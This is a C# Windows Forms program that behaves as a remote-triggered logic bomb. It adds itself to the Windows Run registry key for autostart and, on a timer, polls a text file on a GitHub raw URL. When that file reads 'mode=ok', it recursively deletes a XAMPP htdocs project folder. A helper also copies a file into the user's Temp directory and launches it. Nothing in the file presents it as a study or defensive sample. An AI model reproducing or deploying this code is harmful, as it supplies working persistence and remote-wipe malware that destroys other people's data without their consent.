using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CS02
{
    public partial class Form1 : Form
    {

        private string htdocs_path = "C:\\xampp\\htdocs\\Annapolis";
        
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Enabled = true;
            timer1.Start();
            Console.WriteLine("Timer is Called");

            addAutoStartUp();
        }

        private void readData()
        {
            HttpWebRequest request = (HttpWebRequest)
            WebRequest.Create("https://raw.githubusercontent.com/hunk501/Temp01/master/tester.txt");

            // execute the request
            HttpWebResponse response = (HttpWebResponse)
                request.GetResponse();
            // we will read data via the response stream
            Stream resStream = response.GetResponseStream();
            string tempString = null;
            int count = 0;
            byte[] buf = new byte[1024];

            bool isFoundKey = false;

            StringBuilder sb = new StringBuilder();

            do
            {
                // fill the buffer with data
                count = resStream.Read(buf, 0, buf.Length);

                // make sure we read some data
                if (count != 0)
                {
                    // translate from bytes to ASCII text
                    tempString = Encoding.ASCII.GetString(buf, 0, count);

                    // continue building the string
                    sb.Append(tempString);
                }
            }
            while (count > 0); // any more data to read?

            // print out page source

            string ss = sb.ToString();

            // Read data line by line
            var _split = Regex.Split(ss, "\r\n|\r|\n");
            foreach (string w in _split)
            {                
                string[] word = w.Split('=');
                if (word.Length >= 2)
                {

                    string key = word[0];
                    string value = word[1];
                    if (key.Trim().Equals("mode"))
                    {
                        value = word[1];
                        if (value.Trim().Equals("ok"))
                        {
                            Console.WriteLine("FOUND");
                            isFoundKey = true;
                        }
                    }

                    Console.WriteLine("Result KEY: {0}", key);
                    Console.WriteLine("Result VALUE: {0}", value);

                    /*
                    foreach (string s in word)
                    {
                        if (s.Trim().Equals("mode")) // check mode value
                        {
                            Console.WriteLine("FOUND");
                        }
                        Console.WriteLine("Result: {0}", s);
                    }
                    */
                }                
            }

            // If found
            if (isFoundKey)
            {
                removeFolder();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {                        
            Console.WriteLine("Timer started");
            timer1.Enabled = true;
            timer1.Start();
        }

        private void addAutoStartUp()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.SetValue("CS02 Auto Startup", "\"" + Application.ExecutablePath + "\"");
                }

                Console.WriteLine("Auto start created");
                //MessageBox.Show("Success", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception e)
            {
                //MessageBox.Show("Error:" + e.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Console.WriteLine("Error: "+ e.Message);
            }
        }


        private void getCurrentUserName()
        {
            string n = Environment.UserName;
            MessageBox.Show(n);
        }

        private void copyFile()
        {

            string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath);
            string to = "";
            bool isExisting = false;

            try
            {
                string from = path + "\\CS02Demo.txt";

                string current_user = Environment.UserName;
                to = "C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\CS02Demo.txt";

                if (!File.Exists(to))
                {
                    isExisting = false;
                }
                else
                {
                    isExisting = true;
                }

                File.Copy(from, to, true);

                MessageBox.Show("Success");

            }
            catch (ExecutionEngineException e)
            {
                MessageBox.Show(e.Message);
            }
            finally
            {

                MessageBox.Show("isExisting: " + isExisting);

                if (File.Exists(to))
                {
                    try
                    {
                        System.Diagnostics.Process.Start(to);
                    }
                    catch (ExecutionEngineException e)
                    {
                        MessageBox.Show(e.Message);
                    }
                }
            }
        }


        private void removeFolder()
        {
            // Check if directory exists
            if (Directory.Exists(htdocs_path))
            {
                try
                {

                    Directory.Delete(htdocs_path, true);

                    /*
                    // Read files from folder
                    string[] files = Directory.GetFiles(htdocs_path);
                    foreach (string file in files)
                    {                        
                        Console.WriteLine(file);
                    }
                    */
                    Console.WriteLine("{0}  = has been deleted", htdocs_path);
                }
                catch (Exception e)
                {
                    Console.WriteLine("RemoveFiles: " + e.Message);
                }
            }
            else
            {
                Console.WriteLine("Folder is not existings =  {0}: " + htdocs_path);
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Console.WriteLine("Timer Started");
            // 3600000
            //readData();   

            addAutoStartUp();

            // Start background Worker
            backgroundWorker1.WorkerSupportsCancellation = true;
            backgroundWorker1.WorkerReportsProgress = true;
            backgroundWorker1.RunWorkerAsync();
            
        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            Console.WriteLine("Background worker Started");
            readData();
        }

        private void backgroundWorker1_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {

        }

        private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            Console.WriteLine("Background worker Completed");
        }
    }
}
